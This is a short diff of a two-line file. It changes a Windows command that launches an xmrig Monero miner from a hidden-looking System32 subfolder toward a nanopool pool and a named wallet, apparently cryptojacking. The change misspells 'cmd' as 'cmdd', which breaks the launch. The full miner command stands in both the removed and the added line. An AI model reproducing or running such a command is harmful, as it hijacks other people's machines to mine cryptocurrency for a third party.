@@ -1,2 +1,2 @@
-cmd /c C:\Windows\System32\xm\xmrig.exe --coin monero -o xmr-us-east1.nanopool.org:10300 -u 41g9z6vMVXh9egLLuyJGHyWzRjoagmDHSbgAk7WoxWpGPMSBL33ArZudfN8Fmq8QGPDLLtNdxEevNadr4wxtYhASEx7gpYx
+cmdd /c C:\Windows\System32\xm\xmrig.exe --coin monero -o xmr-us-east1.nanopool.org:10300 -u 41g9z6vMVXh9egLLuyJGHyWzRjoagmDHSbgAk7WoxWpGPMSBL33ArZudfN8Fmq8QGPDLLtNdxEevNadr4wxtYhASEx7gpYx
 teste
